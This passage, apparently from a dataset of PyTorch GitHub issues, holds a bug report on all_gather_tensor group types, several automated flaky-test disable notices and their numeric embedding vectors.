@spawn_threads_and_init_comms
def collect_dtensor(world_size):
  rank = dist.get_rank()
  x = torch.arange(0,16).reshape(4,4)
  mesh = DeviceMesh(""cpu"", [[0,1],[2,3]],mesh_dim_names=['dp','tp'])
  dx = distribute_tensor(x, mesh,[Shard(0),Shard(1)])
  pg1 = dist.new_group([1,2])
  pg2 = dist.new_group([0,3])
  row_data = funcol.all_gather_tensor(dx.to_local(), gather_dim=1, group=pg1) # error

WORLD_SIZE= 4
collect_dtensor(WORLD_SIZE)

#output ValueError: Invalid type for group, must be one of List, Processgroup, DeviceMesh or (DeviceMesh, int).
```
```python

# correct
import os
import torch
import torch.multiprocessing as mp
import torch.distributed._functional_collectives as funcol
import torch.distributed as dist
from torch.testing._internal.common_distributed import spawn_threads_and_init_comms
from torch.distributed._tensor import DTensor, DeviceMesh, Shard, Replicate, distribute_tensor,zeros
from torch.distributed.distributed_c10d import (
    all_to_all,
    broadcast,
    get_global_rank,
    get_rank,
    get_world_size,
    GroupMember,
    ProcessGroup,
    scatter,
    Work,
)
def run(rank, size):

  rank = dist.get_rank()
  x = torch.arange(0,16).reshape(4,4)
  mesh = DeviceMesh(""cpu"", [[0,1],[2,3]],mesh_dim_names=['dp','tp'])
  dx = distribute_tensor(x, mesh,[Shard(0),Shard(1)])
  pg1 = dist.new_group([1,2])
  pg2 = dist.new_group([0,3])
  if rank in [1,2]:
    row_data = funcol.all_gather_tensor(dx.to_local(), gather_dim=1, group=[1,2])
    print(row_data)
def init_process(rank_id, size, fn, backend='gloo'):
    """""" Initialize the distributed environment. """"""
    os.environ['MASTER_ADDR'] = '127.0.0.1'
    os.environ['MASTER_PORT'] = '12347'
    dist.init_process_group(backend, rank=rank_id, world_size=size)
    fn(rank_id, size)

if __name__ == ""__main__"":
    big_tensor = torch.arange(0,16).reshape(4,4)
    print(big_tensor)
    size = 4
    processes = []
    mp.set_start_method(""spawn"")
    for rank in range(size):
        p = mp.Process(target=init_process, args=(rank, size, run))
        p.start()
        processes.append(p)

    for p in processes:
        p.join()
```

_No response_

### Additional context

_No response_
```[tasklist]
### Tasks
```
",False,"[-1.93325862e-01  3.28659356e-01 -2.10739017e-01 -4.51130331e-01
 -2.18366906e-01 -2.89826065e-01  3.06249291e-01  3.07916611e-01
 -2.84869641e-01  6.14030659e-03  2.06084341e-01 -1.62579760e-01
  6.41351789e-02 -1.02962628e-01 -5.37755340e-02  1.31610990e-01
 -1.01644039e-01  1.93360463e-01  9.12292302e-03 -4.29949723e-02
  1.36166498e-01 -1.55676812e-01  1.42559903e-02 -5.62649593e-02
  3.32193486e-02  9.08560604e-02 -1.27883345e-01 -1.10711548e-02
  1.45495564e-01  1.30836904e-01  1.89284936e-01  7.86353424e-02
 -6.34348541e-02  2.13286355e-01 -4.10636514e-02  1.26390129e-01
 -3.53057265e-01  3.07036251e-01 -1.25657290e-01  9.04198587e-02
  7.91042596e-02 -3.95841487e-02  5.68356104e-02  1.48040056e-01
  1.47896707e-01 -1.15234300e-01 -4.24921960e-01  2.04027832e-01
 -1.32651150e-01 -3.06184232e-01  1.03043266e-01 -2.18150318e-01
 -5.10163978e-02 -2.26718485e-02 -6.71579083e-03  6.43506423e-02
  1.16393089e-01  1.15731388e-01  2.72050470e-01 -2.68072076e-02
  1.78400695e-01 -1.34750098e-01  1.81160681e-02 -8.90764818e-02
 -7.47850388e-02  3.94878499e-02 -5.11653721e-04  1.82687819e-01
  1.39189422e-01  2.71712095e-01  3.58888030e-01 -3.52538407e-01
 -8.58398005e-02 -2.88759053e-01  3.67404222e-01  2.32956916e-01
 -3.99317801e-01  1.47201687e-01 -1.98426306e-01 -4.03583467e-01
  5.37846163e-02  1.70226265e-02 -1.14489034e-01  2.70444989e-01
  3.04627091e-01  2.82712132e-01  3.29317629e-01  2.20781684e-01
  2.24007845e-01  2.19251454e-01  1.64046988e-01  2.68547952e-01
 -3.14634442e-01 -5.26044667e-02 -7.58092478e-02  3.90445173e-01
  1.30020455e-01 -2.59428799e-01  8.55562165e-02  1.13836609e-01
 -5.08085132e-01 -3.25033247e-01 -2.38054588e-01  1.60447925e-01
 -2.73579299e-01 -3.78190160e-01  3.82483974e-02  3.28111440e-01
 -4.72207926e-02  4.54849489e-02  2.83197220e-02  2.71279156e-01
 -4.61757898e-01  1.78102538e-01  2.54109323e-01 -2.94345796e-01
 -1.14346310e-01  3.22621137e-01 -2.51187503e-01 -1.10027239e-01
  3.40178549e-01  2.46174738e-01 -8.24802071e-02  4.43336606e-01
  1.47867590e-01  6.43836632e-02 -1.88586444e-01  2.38497496e-01
  4.71730456e-02  2.17056781e-01 -8.66690651e-02  4.83189002e-02
 -4.10696864e-03 -4.39871609e-01 -5.30189350e-02  7.50256553e-02
  3.75636280e-01 -1.02670535e-01 -5.74846506e-01 -8.19755048e-02
 -9.54671353e-02  9.56447497e-02  4.19501483e-01 -2.96743661e-01
  3.12188625e-01  1.33847952e-01 -6.50349319e-01 -3.05776477e-01
 -1.38154030e-01  8.70018676e-02 -1.23499490e-01 -1.07469805e-01
  5.47794662e-02  1.84663653e-01  3.43842536e-01 -5.66490293e-02
 -9.58546847e-02  1.25175223e-01  1.08752504e-01 -1.13383129e-01
  2.80246377e-01  2.01152503e-01  5.80196977e-01  1.99398287e-02
  2.23050922e-01 -1.19460210e-01 -2.09852159e-01 -2.64690191e-01
 -8.53980035e-02  1.31126821e-01 -2.39777878e-01 -3.94819118e-02
 -1.82093471e-01  2.77874976e-01  3.87534536e-02 -2.18935445e-01
 -3.04185688e-01 -2.84135621e-02 -1.58066362e-01  2.60516405e-01
 -3.04040313e-03 -2.38680020e-02  6.02294505e-01  4.17013355e-02
 -2.09054351e-01  3.79841536e-01  1.15440831e-01  2.54585177e-01
 -1.02395251e-01 -2.02226847e-01 -3.01271707e-01  5.02500273e-02
 -5.78549914e-02 -1.09786332e-01 -1.47264332e-01 -1.78857535e-01
  2.35116348e-01 -3.24724317e-01 -1.68943420e-01  1.57838196e-01
 -1.24552183e-01  1.04030654e-01 -1.98671333e-02 -5.04205897e-02
  2.16406018e-01  3.72486979e-01 -3.33523333e-01 -3.37149620e-01
 -6.31845519e-02  2.70009935e-01 -2.72176042e-03 -4.81810987e-01
  2.08017960e-01 -4.78772447e-02  3.44312072e-01 -3.27601284e-01
 -6.02188371e-02 -7.88278691e-03 -5.96959352e-01  1.16373464e-01
 -2.86489844e-01 -6.41440302e-02 -3.45339060e-01 -3.24229300e-01
 -4.72022593e-02  2.20683962e-01  4.18270454e-02 -2.91779965e-01
  1.49613127e-01  2.71764770e-02 -3.46110493e-01 -3.16087276e-01
  3.19002777e-01  2.97924817e-01  1.15698837e-01  2.71170437e-02
 -1.03435993e-01 -1.09188415e-01 -6.01753034e-02  7.36930966e-02
 -1.57016218e-01 -1.58230335e-01 -2.53858000e-01  1.54436857e-01
 -3.43669616e-02  1.58522412e-01 -5.12941591e-02 -5.71900383e-02
 -1.57581046e-01  1.94109529e-01 -1.58371001e-01  4.66583744e-02
 -2.70401657e-01 -9.57251042e-02  3.21669504e-02 -1.02008916e-01
 -1.71311498e-01 -2.13214710e-01 -3.60052064e-02 -1.60789728e-01
  2.86713839e-01  6.51931614e-02 -2.83629149e-01  1.00778844e-02
  3.44452322e-01  1.21065557e-01 -9.43058208e-02  3.70972753e-01
 -2.43281752e-01 -4.68224943e-01  2.98837692e-01 -3.17762613e-01
 -1.79857135e-01 -2.89674103e-03  2.47743651e-01 -2.03884602e-01
  3.56853127e-01 -2.46778458e-01 -8.60747695e-02  1.21294379e-01
  8.59933197e-02  5.61532341e-02 -2.69541182e-02  1.51825637e-01
  2.87620425e-01 -3.25560004e-01 -1.05297998e-01  1.26596838e-02
 -4.76711094e-02 -1.52165070e-01  6.44303262e-02 -8.25405866e-02
 -2.10356951e-01 -2.84109972e-02 -1.31333455e-01 -9.77401584e-02
  2.77872294e-01  1.00468300e-01 -2.33405501e-01 -3.98757458e-01
 -1.32247806e-01  1.26220971e-01  2.14786470e-01 -2.80654341e-01
 -2.38046139e-01  1.31376207e-01  5.97947910e-02 -2.63590701e-02
  6.14941239e-01  1.78790763e-02  3.19789797e-01  1.34228468e-01
  1.03576690e-01  9.49944109e-02 -1.55601308e-01  1.47711128e-01
 -2.86302418e-01  3.45811039e-01  7.50738978e-02  1.32193699e-01
  2.23919109e-01  2.04618946e-01 -2.05001414e-01  2.25049078e-01
  3.20449591e-01  9.84968096e-02 -5.49331784e-01  1.19012129e-02
  1.44572988e-01  1.31594449e-01  2.98288465e-01  5.48506975e-02
  1.40728787e-01  1.35997593e-01  1.99260369e-01 -2.41663754e-01
 -2.46419579e-01  1.16747789e-01 -2.15234265e-01 -4.87748027e-01
 -2.89075345e-01 -2.50837281e-02  3.05775076e-01 -4.62250449e-02
 -1.22266509e-01 -1.98903903e-01 -1.07690945e-01  1.93610489e-01
 -9.92898569e-02  2.62418151e-01  1.72928214e-01  1.14869460e-01
  1.68439254e-01  3.02925389e-02  1.88690007e-01  5.29677749e-01
 -4.94356990e-01  1.45487845e-01  2.79394984e-01  4.09004688e-01
 -1.25270471e-01  1.46177441e-01 -3.86412889e-02  3.34780633e-01
  1.48295194e-01  4.51579690e-02  2.19345376e-01 -1.20338671e-01
 -1.46914154e-01  7.11761415e-02 -7.47290030e-02  1.11453384e-01
 -2.02509031e-01 -1.53787613e-01 -1.20833255e-02 -5.00782672e-03
  2.36181796e-01 -1.06375597e-01 -3.26888502e-01 -6.11664131e-02
 -3.51550989e-02 -1.40634924e-01 -1.16742820e-01  7.86747411e-02]"
DISABLED test_dropout_layout_torch_jagged_cpu_float64 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_dropout_layout_torch_jagged_cpu_float64&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18249215223).

Over the past 3 hours, it has been determined flaky in 8 workflow(s) with 24 failures and 8 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_dropout_layout_torch_jagged_cpu_float64`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-4.73038137e-01  1.49138272e-01 -2.00349107e-01 -2.82152798e-02
 -6.56524077e-02 -4.15452063e-01  7.10346848e-02  2.17080414e-01
 -3.98766279e-01 -2.02597901e-01  2.38785297e-01 -1.28163695e-01
  1.95777282e-01  1.32467359e-01  1.33442000e-01 -1.21199474e-01
 -1.69637799e-01 -1.39842495e-01  4.73783731e-01  2.48541962e-02
 -7.90426433e-02  6.58720732e-04 -2.62476206e-01  1.90975338e-01
 -5.59526496e-03  5.24005145e-02 -1.86129272e-01  2.19729915e-03
  9.34045762e-02  7.59071037e-02  2.23645270e-01  3.62980738e-02
 -4.16690409e-01  1.01182535e-02  4.56568778e-01  1.18393332e-01
 -1.20733492e-01  2.89384834e-02 -4.79713112e-01 -2.01252252e-01
  2.12691337e-01  2.48815238e-01 -2.51567885e-02 -9.90183651e-02
  2.22875416e-01  1.28281534e-01 -1.71689481e-01  2.90248334e-01
 -2.96400845e-01 -6.55590445e-02  2.34204367e-01 -1.51846975e-01
 -3.27645056e-03 -2.67782211e-01  1.29965976e-01 -2.48061150e-01
  1.53988540e-01  3.27512801e-01  1.57352567e-01  1.08218491e-01
  1.71988130e-01 -4.86650243e-02 -7.54314214e-02 -1.76044144e-02
 -1.18034750e-01  7.87750036e-02  2.39335209e-01 -1.94476813e-01
  4.26505029e-01 -9.67894122e-02  1.88808709e-01 -1.08031139e-01
 -1.46546796e-01  7.80492127e-02  1.92956567e-01  1.11929119e-01
 -4.85084683e-01  3.36520746e-03 -2.36579478e-01 -4.92311083e-02
  5.94600998e-02 -5.73556051e-02 -1.89192779e-02  1.05234399e-01
  2.34484121e-01  3.18691730e-02  1.31117880e-01 -1.30786836e-01
  2.44917452e-01  2.78505087e-02  1.03778899e-01  3.29443812e-01
 -1.74800217e-01  1.02714963e-01 -3.66567492e-01 -2.14393511e-02
  3.22421551e-01 -3.35697532e-01 -3.32352221e-01  1.22034684e-01
  7.21150935e-02 -6.51170015e-01 -1.16018899e-01  4.43572253e-01
  3.82367596e-02 -2.40408272e-01  4.83343810e-01  1.40332222e-01
  1.37728184e-01 -1.71626464e-01  1.76044911e-01  2.97123231e-02
  2.33771615e-02  8.94919857e-02  7.90253431e-02 -2.32160449e-01
 -2.27179110e-01 -9.46652666e-02 -1.88875586e-01  5.16012788e-01
 -5.68193793e-02 -7.50954524e-02 -1.11011742e-02  1.21701650e-01
  5.07720709e-01  1.71874557e-02 -1.55774996e-01  6.91532865e-02
  1.83916628e-01  4.01280224e-02 -1.26718014e-01  1.11096390e-01
 -1.43077046e-01 -1.30734459e-01  1.92562819e-01  1.88403994e-01
 -2.85053253e-01 -1.02270231e-01  8.77542198e-02 -1.24967560e-01
 -2.12781072e-01  2.20616430e-01  1.31791681e-01 -2.97189146e-01
  3.70444983e-01  1.61071662e-02 -3.16642702e-01  5.60185015e-02
 -9.37396735e-02  8.49896893e-02  1.69513784e-02  5.93853705e-02
  6.38532452e-03  4.39862013e-01 -4.23302576e-02 -4.19429466e-02
  3.16410899e-01  1.70455545e-01  1.01209655e-01 -1.23913981e-01
  1.29836142e-01  3.73025388e-01  1.27283344e-03 -1.70465261e-02
  2.00835496e-01 -2.43684858e-01 -5.42179286e-01  2.08879970e-02
 -1.27941087e-01  1.60861053e-02 -1.87407255e-01 -4.08259295e-02
  2.75513344e-02 -2.38013491e-02 -1.05863158e-02 -2.01019645e-02
  1.69396222e-01 -2.96690464e-01 -1.43466562e-01  3.53689790e-01
  2.12416023e-01  2.32009634e-01  2.81761378e-01  1.43223494e-01
 -7.54928291e-02  1.89743876e-01  2.74719507e-01 -2.00915039e-01
  8.08006525e-02 -1.22227713e-01 -6.44891620e-01 -2.72599995e-01
  1.44400328e-01 -1.48097277e-01 -2.05284134e-01 -5.77717870e-02
  5.18006198e-02 -2.93050706e-01 -4.51842174e-02 -5.22391871e-02
 -2.15170622e-01  3.24551642e-01  1.54384673e-01 -2.03788117e-01
  2.60990039e-02  2.82980800e-01 -1.70722246e-01 -4.21933174e-01
  5.61818779e-02  3.85124460e-02 -2.42095351e-01 -1.10422187e-01
 -2.64296502e-01 -2.02867359e-01  2.63624310e-01 -2.23854352e-02
 -8.17527100e-02 -1.53773502e-02 -1.58965513e-02  2.89849609e-01
 -6.41295761e-02 -1.49213374e-01 -3.07388365e-01 -2.16818973e-01
 -4.35648918e-01  2.85554454e-02 -2.98174739e-01  2.90278316e-01
 -4.50879484e-02 -4.92361337e-02 -2.06506714e-01 -2.02542007e-01
  2.23391443e-01 -5.82536310e-03  2.33948216e-01 -1.74928874e-01
 -3.63929898e-01 -1.14794932e-01 -3.65468897e-02  4.40458924e-01
 -5.81575692e-01 -4.75819737e-01  4.89686131e-02  4.79205474e-02
 -2.02158894e-02 -4.49619442e-02 -1.82833344e-01 -9.45706964e-02
 -1.14710011e-01  2.08334550e-01 -1.20010301e-01 -2.69338548e-01
 -4.25868630e-02  1.92847140e-02  1.33578598e-01  4.33126658e-01
  2.11343355e-02 -5.80287501e-02  1.99215040e-02  5.09553030e-03
 -7.71907810e-03  2.54070044e-01 -2.48212874e-01  3.26044858e-01
  1.10145785e-01  1.13413922e-01 -1.97318614e-01  1.48848385e-01
 -2.00315472e-02 -1.36347532e-01  4.86051321e-01 -5.46644807e-01
  2.60331094e-01  2.37648919e-01  1.52971163e-01 -2.35282138e-01
  4.57768172e-01  3.14570963e-01 -8.06108862e-02 -2.31705070e-01
  1.70214891e-01  1.49613470e-01 -1.59722894e-01 -1.75305475e-02
  2.23205805e-01 -2.61527061e-01 -1.58127278e-01 -8.36904645e-02
 -7.14640766e-02 -2.29120702e-01 -2.68926658e-03  1.51210666e-01
  7.53853545e-02  3.73417735e-02 -4.99219418e-01 -3.36281955e-05
  4.59470481e-01 -3.15251470e-01  1.76579565e-01 -1.43072948e-01
 -1.14360049e-01  1.92794070e-01  9.12980288e-02 -3.11013222e-01
  5.69036528e-02 -1.09762684e-01  1.58662021e-01  2.77605131e-02
  5.09615004e-01 -3.83207083e-01 -5.74081242e-02  2.75389850e-01
 -2.45801220e-03  3.58919531e-01  6.93796203e-03  1.18681148e-01
  3.21385637e-03  2.09097236e-01  1.00138886e-02  1.10391915e-01
  4.26152110e-01 -1.95935562e-01 -3.49326372e-01  9.19294357e-02
  1.22781187e-01  2.96600051e-02 -2.71708190e-01 -4.26823422e-02
 -1.67600796e-01 -1.28614992e-01 -1.66840613e-01 -9.40198377e-02
 -1.49681449e-01 -1.44905195e-01 -3.63770612e-02 -2.13040844e-01
 -6.76655099e-02  5.19699991e-01 -8.68243724e-02 -2.52804458e-01
 -4.39767092e-02 -9.08799469e-04  1.65040359e-01 -2.98489332e-01
 -1.95893690e-01 -2.15029456e-02  2.38535002e-01 -2.55461987e-02
  1.47290766e-01  1.77314505e-01 -1.77741066e-01  2.14801505e-02
 -1.58994704e-01  1.90248452e-02  1.95512950e-01  5.72252035e-01
 -1.00380227e-01  2.49172866e-01  3.21974546e-01  6.14388287e-01
 -1.45491526e-01  1.04014851e-01 -4.14794952e-01 -3.81673366e-01
  2.75192410e-01 -3.85296717e-02 -1.95101835e-03 -9.00054500e-02
 -1.40262544e-02  3.84367585e-01 -4.93884355e-01  2.61142552e-01
 -2.30363205e-01  3.67997676e-01  2.24003911e-01 -1.05243012e-01
  4.37760085e-01 -1.23266667e-01  4.45183516e-02  3.27536091e-02
 -3.86670493e-02  1.21044330e-01  1.09641273e-02  1.13801762e-01]"
DISABLED test_meta_outplace_nn_functional_margin_ranking_loss_cpu_int64 (__main__.TestMetaCPU) triaged module: flaky-tests skipped module: primTorch oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_meta_outplace_nn_functional_margin_ranking_loss_cpu_int64&suite=TestMetaCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18246954485).

Over the past 3 hours, it has been determined flaky in 9 workflow(s) with 27 failures and 9 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_meta_outplace_nn_functional_margin_ranking_loss_cpu_int64`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_meta.py`

cc @ezyang @mruberry @Lezcano @peterbell10 @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-3.03364724e-01  1.63462311e-01 -1.14800878e-01  5.98820224e-02
  6.88384622e-02 -2.00332224e-01  8.51908922e-02  4.36967939e-01
 -3.09542537e-01 -1.88362211e-01  3.63100439e-01 -3.80209312e-02
  2.81455278e-01 -1.23389006e-01 -1.62643760e-01 -1.33477360e-01
 -9.38359350e-02  3.80012114e-03  3.01786631e-01  1.01949144e-02
 -1.91559061e-01  4.01540548e-02 -2.75401622e-01  2.77535558e-01
  4.10197824e-02 -4.52730097e-02 -3.17157924e-01  2.66089976e-01
 -1.37745384e-02  2.29805648e-01  3.31168622e-01  7.95634761e-02
 -4.07038331e-01 -4.57673855e-02  4.39608902e-01  1.11945771e-01
 -2.60711052e-02 -1.18436173e-01 -1.71925753e-01 -2.03243703e-01
  5.49249835e-02  1.12124383e-01  6.43202811e-02 -3.06886919e-02
  2.97286302e-01 -1.33607566e-01 -3.27344239e-01 -4.25611287e-02
 -2.87884951e-01 -1.47384375e-01  1.98898762e-02 -5.46252094e-02
 -2.17196599e-01 -3.59993517e-01  1.30657405e-01 -1.78293213e-02
  2.03786924e-01  3.20535243e-01  1.12689465e-01  3.54200900e-02
  4.09126222e-01 -1.42087802e-01 -6.81546181e-02 -7.82736465e-02
  1.19644217e-02  1.52924761e-01  1.68299466e-01 -1.17558330e-01
  4.12465215e-01  7.48890787e-02  2.32792079e-01 -1.23484962e-01
 -2.99564958e-01  8.52447450e-02  2.41584510e-01  3.16070974e-01
 -4.06561732e-01 -1.22208551e-01 -7.51433074e-02 -7.70982578e-02
  1.42782986e-01  3.10694054e-03 -2.26546451e-01 -1.37532011e-01
  2.48078465e-01  4.20742556e-02  1.76045477e-01 -3.74913782e-01
 -2.64030471e-02 -1.14784107e-01  2.87023664e-01  4.51308861e-02
 -2.04019040e-01  1.90350227e-02 -1.80206537e-01 -1.03213964e-02
  1.64169699e-01 -2.71566451e-01 -2.48470396e-01  1.56644985e-01
  1.48232222e-01 -2.28213355e-01 -3.96620870e-01  8.10088813e-02
 -4.53536242e-01 -1.73829406e-01  4.10142839e-01  2.57060587e-01
  1.38398051e-01 -1.50071591e-01  1.00107916e-01  1.14399213e-02
 -2.13062428e-02  4.59786020e-02  1.44990116e-01  4.07625623e-02
 -3.12176440e-02 -2.25242693e-02  1.81738481e-01  4.77477670e-01
 -2.68287867e-01  5.42801917e-02  5.22257090e-02  3.63370683e-03
  4.73506927e-01 -7.28692710e-02 -4.97448817e-02  1.08949788e-01
  1.54169783e-01 -1.53523281e-01  4.62534055e-02  6.05818853e-02
 -1.49128810e-01 -3.13259810e-02 -1.12260081e-01 -7.65544623e-02
  1.79561377e-01 -1.70972228e-01  1.29543066e-01  7.50734955e-02
 -4.15959060e-01  7.69671127e-02  4.67360727e-02 -2.96746910e-01
  3.24356079e-01  9.10389200e-02 -2.93790638e-01 -9.78120416e-02
  7.60455132e-02  3.88454236e-02  1.46593481e-01  1.20727368e-01
  9.72247422e-02  2.32595235e-01 -8.85366872e-02  1.49183452e-01
  1.20089874e-01  1.36565283e-01 -7.15567321e-02 -1.97426323e-02
  6.34998977e-02  2.36752257e-01 -1.90761060e-01 -1.46406293e-01
 -1.49024650e-02  3.36807668e-02 -2.96868205e-01  2.05059852e-02
 -3.29443455e-01  2.26899087e-01  1.32569540e-02  6.09238781e-02
 -1.07225869e-02  5.28301783e-02  2.27209195e-01 -1.24069251e-01
  9.64936912e-02 -4.04465288e-01 -1.43103927e-01  2.41774902e-01
  7.03157485e-02  9.69119929e-03  1.06488332e-01  2.36975297e-01
 -4.56629833e-03  1.24488182e-01  1.72203064e-01 -1.60125732e-01
  1.14538416e-01  1.41800284e-01 -5.56647420e-01 -7.00731575e-02
  3.64814460e-01  1.82568371e-01 -2.06209689e-01 -3.72629791e-01
  1.17123805e-01  6.68668672e-02  1.12579670e-02 -5.47815487e-02
 -2.47800082e-01  2.02874959e-01  2.18620539e-01 -1.37596533e-01
 -2.09191427e-01  7.90656358e-02 -5.01338094e-02 -3.09723914e-01
  5.54894768e-02  6.06600493e-02 -5.57722211e-01 -1.41689122e-01
 -4.20230851e-02 -2.38837063e-01  1.75617307e-01 -4.06480730e-02
  2.01880038e-02 -1.13770172e-01  2.15747058e-01  3.37501228e-01
  3.91696207e-03 -4.99149412e-02 -3.73599768e-01 -2.25125298e-01
 -4.36462462e-01  1.63626611e-01 -3.13568234e-01  2.17052922e-01
 -2.27676034e-01  1.53801680e-01 -2.24658191e-01 -2.29981184e-01
  4.27885830e-01  1.75100803e-01  2.95013487e-01 -1.10282622e-01
 -2.43289590e-01 -8.80564377e-02 -8.42785612e-02  1.95595622e-01
 -6.08978868e-01 -4.70238149e-01 -2.11895168e-01  2.93549955e-01
  2.11858168e-01  1.78639740e-01 -4.04622972e-01 -3.09618041e-02
 -1.93467364e-01  1.95480764e-01 -2.81877100e-01 -2.75582075e-01
  1.73704967e-01 -1.10608593e-01  3.52973565e-02  4.45886791e-01
 -1.80135854e-03 -1.41894415e-01  1.31015763e-01 -1.40304640e-02
  1.10335425e-01  8.01814348e-02 -2.34240741e-01  3.53751779e-01
  1.63338453e-01  2.07747489e-01 -2.74621636e-01  1.71563029e-02
  2.07721382e-01 -6.29454851e-02  3.24828804e-01 -8.10208440e-01
  2.29713231e-01  2.40047008e-01  3.21031034e-01 -1.28534913e-01
  2.85637498e-01  8.75353888e-02 -4.12230380e-04 -1.15736566e-01
  6.31000847e-02  2.61698365e-01 -2.96132535e-01  1.42535537e-01
  1.11337483e-01 -1.53315827e-01 -1.69314057e-01  7.59480745e-02
 -1.98472157e-01 -5.91691211e-02 -6.04344010e-02  1.78568929e-01
 -2.00953316e-02 -2.06976786e-01 -1.74776912e-01  2.05413461e-01
  3.10069025e-01 -4.03386742e-01  4.47536148e-02 -1.97828323e-01
 -8.15194696e-02  3.05428624e-01  1.58270717e-01 -2.49367021e-02
  6.07336909e-02  1.00823320e-01  2.73504823e-01 -7.73424655e-02
  3.06024969e-01 -3.03508759e-01 -5.62335588e-02  3.51368546e-01
 -8.07104558e-02  2.83696175e-01  1.83598250e-02 -1.52519360e-01
 -1.17808565e-01  1.61643982e-01 -6.51498744e-03  1.93122402e-02
  2.67825246e-01 -1.09150395e-01 -2.37486169e-01  3.91718924e-01
  5.91397397e-02  1.46603212e-02 -2.97455013e-01 -2.32031688e-01
 -5.81958368e-02  1.35596976e-01  7.99642652e-02  1.35421783e-01
 -4.34317112e-01  4.53978255e-02 -2.56318867e-01 -9.15453285e-02
 -2.84580082e-01  5.51921248e-01  9.98827517e-02 -1.91676900e-01
  6.51430339e-02  2.32180506e-01  1.59877315e-01 -3.68614763e-01
 -8.77683461e-02 -1.08550183e-01  5.97859100e-02  3.10277671e-01
  6.37730211e-02  2.50962108e-01  1.22326566e-03 -4.89068106e-02
 -3.85658264e-01 -1.47203673e-02  2.91693211e-01  3.81667316e-01
  1.65885448e-01  2.68729448e-01  1.48458958e-01  6.57032967e-01
 -2.08042324e-01 -4.19774726e-02 -6.07449770e-01 -2.37364084e-01
  2.50979185e-01 -1.65547907e-01  9.86605138e-02 -1.21473735e-02
  9.00546983e-02 -1.32375956e-01 -2.13789940e-01  1.17151141e-01
 -1.94713607e-01  1.66168451e-01  1.21245878e-02  1.75095256e-03
  3.26255560e-02 -5.52780926e-04 -3.01818728e-01 -2.39039302e-01
  2.27255017e-01  6.37638867e-02 -5.03259264e-02  2.34204322e-01]"
DISABLED test_dropout_layout_torch_jagged_cpu_float32 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_dropout_layout_torch_jagged_cpu_float32&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18242193791).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 6 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_dropout_layout_torch_jagged_cpu_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-0.45705128  0.13610736 -0.21664786 -0.02584331 -0.05390836 -0.43546364
  0.08998313  0.23184225 -0.3943559  -0.21439496  0.23557416 -0.17600505
  0.19474547  0.1223532   0.13604337 -0.12673083 -0.16053602 -0.15723228
  0.47293723  0.01765192 -0.08203226  0.01434496 -0.25195208  0.21532148
 -0.00473306  0.05725596 -0.18211545 -0.01237879  0.09396662  0.07281931
  0.23796052  0.02595115 -0.40466675  0.017383    0.44992208  0.11741076
 -0.1251865   0.01846809 -0.49362195 -0.1819574   0.21191084  0.2526008
 -0.02107333 -0.11176408  0.2328717   0.13635176 -0.17801222  0.29642886
 -0.31513402 -0.05450622  0.22530323 -0.16331752 -0.01255364 -0.27444273
  0.13917616 -0.23891553  0.1615394   0.31694627  0.15200485  0.11366791
  0.17425609 -0.06063595 -0.07309689 -0.01381442 -0.12730467  0.0706597
  0.25259432 -0.18328193  0.43250218 -0.10457356  0.19527438 -0.1220071
 -0.14875907  0.09204976  0.20139238  0.10238013 -0.47589168 -0.0083442
 -0.2437335  -0.05340411  0.04324459 -0.04871533 -0.01936928  0.10389403
  0.2400217   0.02093436  0.11730859 -0.13262238  0.22320732  0.03789348
  0.11263309  0.32644793 -0.15785792  0.12388881 -0.36314154 -0.01244177
  0.31302422 -0.331886   -0.3095641   0.11863603  0.05742392 -0.6280329
 -0.13243434  0.46671015  0.02416557 -0.234488    0.506214    0.15792999
  0.13411063 -0.17591175  0.17752841  0.02385394  0.02474556  0.07573798
  0.06935476 -0.23238598 -0.22607416 -0.09861644 -0.19259977  0.5163306
 -0.04385272 -0.07354484 -0.00462076  0.12633355  0.49989095  0.00098017
 -0.16663492  0.06331719  0.17163435  0.03427041 -0.12555888  0.0877929
 -0.1505678  -0.12811574  0.2044893   0.19992079 -0.298818   -0.10510531
  0.0924083  -0.11678328 -0.2042166   0.2110005   0.14456797 -0.293399
  0.38625604  0.01502159 -0.30179232  0.05288173 -0.07948108  0.05348811
